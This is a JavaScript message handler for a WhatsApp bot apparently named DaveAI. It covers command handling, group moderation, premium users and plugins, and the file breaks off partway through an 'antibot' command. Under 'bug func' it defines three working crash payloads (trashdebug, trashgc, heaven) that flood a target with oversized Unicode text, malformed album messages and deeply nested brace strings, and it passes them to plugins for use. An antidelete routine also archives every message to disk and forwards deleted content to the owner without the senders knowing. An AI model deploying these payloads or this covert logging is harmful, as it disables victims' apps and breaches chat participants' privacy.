require("./settings")
const { downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia, generateWAMessageFromContent, GroupSettingChange, jidDecode, WAGroupMetadata, emitGroupParticipantsUpdate, emitGroupUpdate, generateMessageID, jidNormalizedUser, generateForwardMessageContent, WAGroupInviteMessageGroupMetadata, GroupMetadata, Headers, delay, WA_DEFAULT_EPHEMERAL, WADefault, getAggregateVotesInPollMessage, generateWAMessageContent, areJidsSameUser, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaconnet, makeInMemoryStore, MediaType, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WAMediaUpload, mentionedJid, processTime, Browser, MessageType,
Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WAconnet, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header } = require("@whiskeysockets/baileys")
///package depedencies///////////////
const os = require('os')
const fs = require('fs')
const fg = require('api-dylux')
const fetch = require('node-fetch');
const axios = require('axios')
const { exec, execSync } = require("child_process")
const chalk = require('chalk')
const cheerio = require('cheerio');
const crypto = require('crypto');
const nou = require('node-os-utils')
const moment = require('moment-timezone');
const path = require ('path');
const { saveSettings, loadSettings, loadXPrefix, saveXPrefix } = require("./settings");
const { writeFile } = require("./library/utils");
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  delPremiumUser,
  expiredCheck,
  checkPremiumUser,
  getAllPremiumUser
} = require('./library/lib/premiun');
const speed = require('performance-now')
const { Sticker } = require('wa-sticker-formatter');
const yts = require ('yt-search');
const { appname,antidel, herokuapi} = require("./set.js");

/////////exports////////////////////////////////
module.exports = async (dave, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
var msgR = m.message.extendedTextMessage?.contextInfo?.quotedMessage;  
//////////Libraryfunction///////////////////////
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./library/lib/function')
// Main Setting (Admin And Prefix )///////
const budy = (typeof m.text === 'string') ? m.text : '';
        const prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.xprefix
const isCmd = body.startsWith(global.xprefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (dave.user.id.split(':')[0]+'@s.whatsapp.net' || dave.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = dave.user.id.split(':')[0];
const senderNumber = sender.split('@')[0]
const daveshown = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
    const premuser = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const isNumber = x => typeof x === 'number' && !isNaN(x)
const formatJid = num => num.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
const isPremium = daveshown || premuser.map(u => formatJid(u.id)).includes(m.sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await dave.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
/////////////Setting Console//////////////////
console.log(chalk.black(chalk.bgWhite(!command ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
/////////quoted functions//////////////////
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `𝘿𝙖𝙫𝙚𝘼𝙄`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}

// ==================== ANTI-LINK SYSTEM ==================== //
if (global.settings.antilinkgc && global.settings.antilinkgc.enabled) {
    if (budy.match(`chat.whatsapp.com`)) {
        const bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
        if (isAdmins) return m.reply(bvl)
        if (m.key.fromMe) return m.reply(bvl)
        if (daveshown) return m.reply(bvl)

        await dave.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        })
        await dave.sendMessage(from, {
            text: `\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, 
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m })
    }
}

if (global.settings.antilink && global.settings.antilink.enabled) {
    if (budy.match('http') && budy.match('https')) {
        const bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
        if (isAdmins) return m.reply(bvl)
        if (m.key.fromMe) return m.reply(bvl)
        if (daveshown) return m.reply(bvl)

        await dave.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        })
        await dave.sendMessage(from, {
            text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, 
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m })
    }
}

// ==================== AUTO FEATURES ==================== //
if (!m.key.fromMe && global.settings.autoread.enabled) {
    const readkey = {
        remoteJid: m.chat,
        id: m.key.id, 
        participant: m.isGroup ? m.key.participant : undefined 
    }
    await dave.readMessages([readkey]);
}

dave.sendPresenceUpdate('available', m.chat)

if (global.settings.autotyping.enabled) {
    if (m.message) {
        dave.sendPresenceUpdate('composing', m.chat)
    }
}

if (global.settings.autorecord.enabled) {
    if (m.message) {
        dave.sendPresenceUpdate('recording', m.chat)
    }
}

if (global.settings.autobio) {
    let statusUpdateTime = global.settings.statusUpdateTime || 0;
    if (new Date() * 1 - statusUpdateTime > 1000) {
        let uptime = await runtime(process.uptime())
        await dave.updateProfileStatus(`✳️𝘿𝙖𝙫𝙚𝘼𝙄 || Runtime : ${uptime}`)
        global.settings.statusUpdateTime = new Date() * 1;
        global.saveSettings(global.settings);
    }
}

// ==================== CHAT RESTRICTIONS ==================== //
if (!m.isGroup && !daveshown && global.settings.onlygroup) {
    if (command) {
        return m.reply(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${global.owner}`)
    }
}

if (!daveshown && global.settings.onlypc && m.isGroup) {
    if (command) {
        return m.reply("Hello buddy! if you want to use this bot, please chat the bot in private chat")
    }
}

// ==================== PRIVATE MODE ==================== //
if (!global.settings.public && !daveshown) {
    return reply("Bot is in private mode. Only owner can use commands.")
}

// ==================== EPHOTO FUNCTION ==================== //
async function ephoto(url, texk) {
    let form = new FormData 
    let gT = await axios.get(url, {
      headers: {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
      }
    })
    let $ = cheerio.load(gT.data)
    let text = texk
    let token = $("input[name=token]").val()
    let build_server = $("input[name=build_server]").val()
    let build_server_id = $("input[name=build_server_id]").val()
    form.append("text[]", text)
    form.append("token", token)
    form.append("build_server", build_server)
    form.append("build_server_id", build_server_id)
    let res = await axios({
      url: url,
      method: "POST",
      data: form,
      headers: {
        Accept: "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        cookie: gT.headers["set-cookie"]?.join("; "),
      }
    })
    let $$ = cheerio.load(res.data)
    let json = JSON.parse($$("input[name=form_value_input]").val())
    json["text[]"] = json.text
    delete json.text
    let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
      headers: {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        cookie: gT.headers["set-cookie"].join("; ")
        }
    })
    return build_server + data.image
}

const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://n.uguu.se/BacqcVGE.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      Runtime : "${runtime(process.uptime())}",
      message: `Sender : @${m.sender.split('@')[0]}\n愛とは何か？ `,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}


const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `𝘿𝙖𝙫𝙚𝘼𝙄`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const qtext = { key: {fromMe: false, participant: `254104260236@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝘿𝙖𝙫𝙚𝘼𝙄" }}}

////////////////Reply Message////////////////
const replypic = fs.readFileSync('./library/media/connect.jpg');
const quotedMessage = m.quoted?.message?.extendedTextMessage?.contextInfo?.quotedMessage || m.quoted?.message?.imageMessage || m.quoted?.message?.videoMessage;
async function trashreply(teks) {
dave.sendMessage(m.chat, {
text: teks,
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletter",
newsletterName: "𝘿𝙖𝙫𝙚𝘼𝙄" 
}
}
}, {
quoted: qtext
})
}

async function reply(text) {
            dave.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title:"𝘿𝙖𝙫𝙚𝘼𝙄",
                        body:"made by dave",
                        thumbnailUrl: "https://files.catbox.moe/z39yc4.jpg",
                        sourceUrl: null,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted:m})
        }
const trashpic = fs.readFileSync('./library/media/porno.jpg');
async function replymenu(teks) {
dave.sendMessage(m.chat, {
image:trashpic,  
caption: teks,
sourceUrl: 'https://github.com/giftdee',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletter",
newsletterName: "𝘿𝙖𝙫𝙚𝘼𝙄"
}
}
}, {
quoted: fkontak
})
}
 //////////React message///////////////
    const reaction = async (jidss, emoji) => {
    dave.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
 /////////function set presence/////
                   
        
if (m.isGroup) {
    if (body.includes(`@254104260236`)) {
        reaction(m.chat, "❓")
    }
 }
    async function loading () {
var menuload = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
" 𝘿𝙖𝙫𝙚𝘼𝙄..."
]
let { key } = await dave.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < menuload.length; i++) {
await reply( menuload[i],{edit:key })
}
}

///////////////Similarity///////////////////////
function getCaseNames() {
  try {
    const data = fs.readFileSync('./dave.js', 'utf8');
    const casePattern = /case\s+'([^']+)'/g;
    const matches = data.match(casePattern);

    if (matches) {
      return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
    } else {
      return [];
    }
  } catch (error) {
    console.error('error occurred:', error);
    throw error;
  }
}

/////////////fetch commands///////////////
let totalfeature= () =>{
var mytext = fs.readFileSync("./dave.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }
////////////tag owner reaction//////////////
if (m.isGroup) {
    if (body.includes(`@${owner}`)) {
        reaction(m.chat, "❌")
    }
 }
/////////////test bot no prefix///////////////
if ((budy.match) && ["bot",].includes(budy) && !isCmd) {
reply(`𝘿𝙖𝙫𝙚𝘼𝙄 is always online ✅`)
}        
///////////example///////////////////////////
////////bug func/////////////////////
 async function trashdebug(target) {
  await dave.sendMessage(target, {
    text:
      "🧪‌⃰Ꮡ‌‌" +
      "ꦾ࣯࣯" +
      "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" +
      "𑇂𑆵𑆴𑆿".repeat(60000),
    contextInfo: {
      externalAdReply: {
        title: ``,
        body: ``,
        previewType: "PHOTO",
        thumbnail: null,
        sourceUrl: ``
      }
    }
  }, { quoted: m });
}










///////bug group/////////////////  
    async function trashgc(target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await dave.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{participant:{jid:target}})
}
let xx = {"url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c&mms3=true","mimetype": "image/jpeg","fileSha256": "yTsEb/zyGK+lB2DApj/PK+gFA1D6Heq/G0DIQ74uh6k=","fileLength": "52039","height": 786,"width": 891,"mediaKey": "XtKW4xJTHhBzWsRkuwvqwQp/7SVayGn6sF6XgNblyLo=","fileEncSha256": "rm/kKkIFGA1Vh6yKeaetbsvCS7Cp2vcGYoiNkrvPCwY=","directPath": "/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c"}
let xz
for (let s = 0; s < 2; s++) {
if (s === 1) {
xx.caption = "𑲱".repeat(200000);
}
const xy = await generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{participant:{jid:target}})
xz = await dave.relayMessage(target, xy.message, {messageId:xy.key.id})
await sleep(100)
}
}

  async function heaven(target) {
let msg = await generateWAMessageFromContent(target, {
  interactiveMessage: {
    contextInfo: {
      isForwarded: true, 
      forwardingScore: 1972,
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    }, 
    header: {
      jpegThumbnail: null, 
      hasMediaAttachment: true, 
      title: "D | 7eppeli-Exploration"
    }, 
    nativeFlowMessage: {
      buttons: [
        {
          name: "payment_method",
          buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
        }
      ],
      messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
    }, 
  }
}, { userJid:target });

  await dave.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}        

  
// Anti-badword system - simplified
if (m.isGroup && global.antibadword && global.antibadword[from]) {
    const badwords = global.badwordsList || ["badword1", "badword2"];
    const textMsg = (body || budy || "").toLowerCase();
    const found = badwords.find((w) => textMsg.includes(w));
    
    if (found) {
        if (!isAdmins && isBotAdmins) {
            await dave.sendMessage(from, { delete: m.key });
            await dave.sendMessage(from, {
                text: `@${m.sender.split("@")[0]} has been kicked for using bad word: ${found}`,
                mentions: [m.sender],
            });
            await dave.groupParticipantsUpdate(from, [m.sender], "remove");
        }
    }
}
// Save settings
    

    if (!dave.isPublic && !daveshown) return;







 

const baseDir = 'message_data';
if (!fs.existsSync(baseDir)) {
  fs.mkdirSync(baseDir);
}

function loadChatData(remoteJid, messageId) {
  const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
  try {
    if (!fs.existsSync(chatFilePath)) {
      return null;
    }
    const data = fs.readFileSync(chatFilePath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error(`Error loading message ${messageId}:`, error.message);
    return null;
  }
}

function saveChatData(remoteJid, messageId, chatData) {
  const chatDir = path.join(baseDir, remoteJid);

  if (!fs.existsSync(chatDir)) {
    fs.mkdirSync(chatDir, { recursive: true });
  }

  const chatFilePath = path.join(chatDir, `${messageId}.json`);

  try {
    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
  } catch (error) {
    console.error('Error saving chat data:', error);
  }
}

function handleIncomingMessage(message) {
  try {
    const remoteJid = message.key.remoteJid;
    const messageId = message.key.id;

    if (!remoteJid || !messageId || !message.message) return;

    // Save the complete message object
    saveChatData(remoteJid, messageId, message);
  } catch (error) {
    console.error('Error in handleIncomingMessage:', error);
  }
}

async function handleMessageRevocation(dave, revocationMessage) {
  try {
    // The protocolMessage contains the key of the deleted message
    if (!revocationMessage.message?.protocolMessage) {
      console.log('Not a protocol message');
      return;
    }

    const protocolMsg = revocationMessage.message.protocolMessage;

    // Type 0 = REVOKE (message deletion)
    if (protocolMsg.type !== 0) {
      console.log('Not a revoke message, type:', protocolMsg.type);
      return;
    }

    // Get the key of the deleted message
    const deletedMessageKey = protocolMsg.key;
    if (!deletedMessageKey || !deletedMessageKey.id) {
      console.log('No deleted message key found');
      return;
    }

    const remoteJid = deletedMessageKey.remoteJid;
    const messageId = deletedMessageKey.id;

    // Load the original message
    const originalMessage = loadChatData(remoteJid, messageId);

    if (!originalMessage) {
      console.log('Original message not found for:', messageId);
      return;
    }

    // Determine who deleted the message
    const deletedBy = revocationMessage.key.participant || revocationMessage.key.remoteJid;
    const sentBy = originalMessage.key.participant || originalMessage.key.remoteJid;

    const deletedByFormatted = `@${deletedBy.split('@')[0]}`;
    const sentByFormatted = `@${sentBy.split('@')[0]}`;

    // Don't process if bot deleted it
    const botJid = dave.user.id.split(':')[0];
    if (deletedBy.includes(botJid) || sentBy.includes(botJid)) {
      console.log('Bot message, skipping');
      return;
    }

    // Get chat name for context
    let chatName = remoteJid;
    if (remoteJid.endsWith('@g.us')) {
      try {
        const groupMetadata = await dave.groupMetadata(remoteJid);
        chatName = groupMetadata.subject;
      } catch (error) {
        console.error('Error getting group metadata:', error);
      }
    } else {
      chatName = deletedByFormatted;
    }

    // Send to bot owner's inbox (bot's own number)
    const ownerJid = dave.user.id;

    let notificationText = `DaveAI-Antidelete\n\n` +
      `Chat: ${chatName}\n` +
      `Deleted by: ${deletedByFormatted}\n` +
      `Sent by: ${sentByFormatted}\n` +
      `Time: ${new Date().toLocaleString()}\n\n`;

    try {
      // Handle different message types
      if (originalMessage.message?.conversation) {
        const messageText = originalMessage.message.conversation;
        notificationText += `Deleted Message:\n${messageText}`;
        await dave.sendMessage(ownerJid, { text: notificationText });
      } 
      else if (originalMessage.message?.extendedTextMessage) {
        const messageText = originalMessage.message.extendedTextMessage.text;
        notificationText += `Deleted Content:\n${messageText}`;
        await dave.sendMessage(ownerJid, { text: notificationText });
      }
      else if (originalMessage.message?.imageMessage) {
        notificationText += `Deleted Media: Image`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage);
          const caption = originalMessage.message.imageMessage.caption || '';
          await dave.sendMessage(ownerJid, { 
            image: buffer,
            caption: `${notificationText}\n\n${caption ? `Caption: ${caption}` : ''}`
          });
        } catch (mediaError) {
          console.error('Failed to download image:', mediaError);
          notificationText += `\n\nCould not recover deleted image (media may have expired)`;
          await dave.sendMessage(ownerJid, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.videoMessage) {
        notificationText += `Deleted Media: Video`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage);
          const caption = originalMessage.message.videoMessage.caption || '';
          await dave.sendMessage(ownerJid, { 
            video: buffer, 
            caption: `${notificationText}\n\n${caption ? `Caption: ${caption}` : ''}`
          });
        } catch (mediaError) {
          console.error('Failed to download video:', mediaError);
          notificationText += `\n\nCould not recover deleted video (media may have expired)`;
          await dave.sendMessage(ownerJid, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.stickerMessage) {
        notificationText += `Deleted Media: Sticker`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage);      
          await dave.sendMessage(ownerJid, { sticker: buffer });
          await dave.sendMessage(ownerJid, { text: notificationText });
        } catch (mediaError) {
          console.error('Failed to download sticker:', mediaError);
          notificationText += `\n\nCould not recover deleted sticker`;
          await dave.sendMessage(ownerJid, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.documentMessage) {
        notificationText += `Deleted Media: Document`;
        const docMessage = originalMessage.message.documentMessage;
        const fileName = docMessage.fileName || `document_${Date.now()}.dat`;

        try {
          const buffer = await dave.downloadMediaMessage(originalMessage);
          if (!buffer) throw new Error('Empty buffer');

          await dave.sendMessage(ownerJid, { 
            document: buffer, 
            fileName: fileName,
            mimetype: docMessage.mimetype || 'application/octet-stream',
            caption: notificationText
          });
        } catch (mediaError) {
          console.error('Failed to download document:', mediaError);
          notificationText += `\n\nCould not recover deleted document (file: ${fileName})`;
          await dave.sendMessage(ownerJid, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.audioMessage) {
        const isPTT = originalMessage.message.audioMessage.ptt === true;
        notificationText += `Deleted Media: ${isPTT ? 'Voice Note' : 'Audio'}`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage);
          await dave.sendMessage(ownerJid, { 
            audio: buffer, 
            ptt: isPTT, 
            mimetype: 'audio/mpeg'
          });
          await dave.sendMessage(ownerJid, { text: notificationText });
        } catch (mediaError) {
          console.error('Failed to download audio:', mediaError);
          notificationText += `\n\nCould not recover deleted audio`;
          await dave.sendMessage(ownerJid, { text: notificationText });
        }
      }
      else if (originalMessage.message?.contactMessage) {
        notificationText += `Deleted Media: Contact`;
        try {
          const contact = originalMessage.message.contactMessage;
          const vcard = contact.vcard;
          await dave.sendMessage(ownerJid, {
            contacts: {
              displayName: contact.displayName || 'Contact',
              contacts: [{ vcard }]
            }
          });
          await dave.sendMessage(ownerJid, { text: notificationText });
        } catch (error) {
          console.error('Failed to send contact:', error);
          notificationText += `\n\nCould not recover deleted contact`;
          await dave.sendMessage(ownerJid, { text: notificationText });
        }
      }
      else if (originalMessage.message?.locationMessage) {
        notificationText += `Deleted Media: Location`;
        try {
          const location = originalMessage.message.locationMessage;
          await dave.sendMessage(ownerJid, {
            location: {
              degreesLatitude: location.degreesLatitude,
              degreesLongitude: location.degreesLongitude
            }
          });
          await dave.sendMessage(ownerJid, { text: notificationText });
        } catch (error) {
          console.error('Failed to send location:', error);
          notificationText += `\n\nCould not recover deleted location`;
          await dave.sendMessage(ownerJid, { text: notificationText });
        }
      }
      else {
        console.log('Unknown message type:', Object.keys(originalMessage.message || {}));
        notificationText += `Deleted Message: Unknown type\n\nMessage Keys: ${Object.keys(originalMessage.message || {}).join(', ')}`;
        await dave.sendMessage(ownerJid, { text: notificationText });
      }
    } catch (error) {
      console.error('Error handling deleted message:', error);
      notificationText += `\n\nError recovering deleted content: ${error.message}`;
      await dave.sendMessage(ownerJid, { text: notificationText });
    }
  } catch (error) {
    console.error('Error in handleMessageRevocation:', error);
  }
}

// Use global settings instead of antiDelSettings - COMPLETELY REPLACED
if (global.settings.antidelete.enabled) {
  // Check if this is a deletion protocol message (Type 0 = REVOKE)
  if (m.message?.protocolMessage?.type === 0) {
    await handleMessageRevocation(dave, m);
  } else if (m.message) {
    // Store incoming message for potential future deletion
    handleIncomingMessage(m);
  }
}




///////////end bug func///////////
const example = (teks) => {
return `\n *invalid format!*\n`
}
const menu = require('./library/listmenu/menulist');
/////////////plugins commands/////////////
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}
//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "daveplugins"))
const trashdex = { daveshown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,dave,m,q,mime,sleep,fkontak,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage,heaven,menu,loading,quotedMessage}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, trashdex)
}
}
if (!pluginsDisable) return
switch (command) {
case 'script':
case 'repo': {
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name    : ${botname}
│ • Owner   : ${ownername}
│ • Version  : ${botversion}
│ • Repo : gitHub.com/gifteddevsmd/Dave-Ai/fork 
│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
`
  reply(botInfo)
}
break

case 'antibot': {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !daveshown) return m.reply(mess.owner);

    try {
        await m.reply("Scanning group for suspected bot accounts...");

        const groupMeta = await dave.groupMetadata(from);
        const botJid = dave.user.id.split(':')[0] + '@s.whatsapp.net';

        const suspectedBots = groupMeta.participants.filter(p => {
            const hasBotInId = p.id.toLowerCase().includes('bot');
            const noProfilePic = !p.picture || p.picture === null;
            const defaultStatus = !p.status || p.status === null;

            // EXCLUDE: bot itself, message sender, and group admins
            const isAdmin = p.admin !== null; 
            const isSelf = p.id === m.sender;
            const isBotSelf = p.id === botJid;

            return (hasBotInId || (noProfilePic && defaultStatus)) && !isAdmin && !isSelf && !isBotSelf;
        });

        if (suspectedBots.length === 0) {
            return m.reply("No suspected bots detected in this group.");
        }

        let botListText = suspectedBots.map((b, i) => `${i + 1}. @${b.id.split('@')[0]}`).join('\n');
        await dave.sendMessage(from, {
            text: `Suspected bot accounts detected:\n\n${botListText}\n\nThese accounts will be removed in 10 seconds.`,
            mentions: suspectedBots.map(b => b.id)
        });

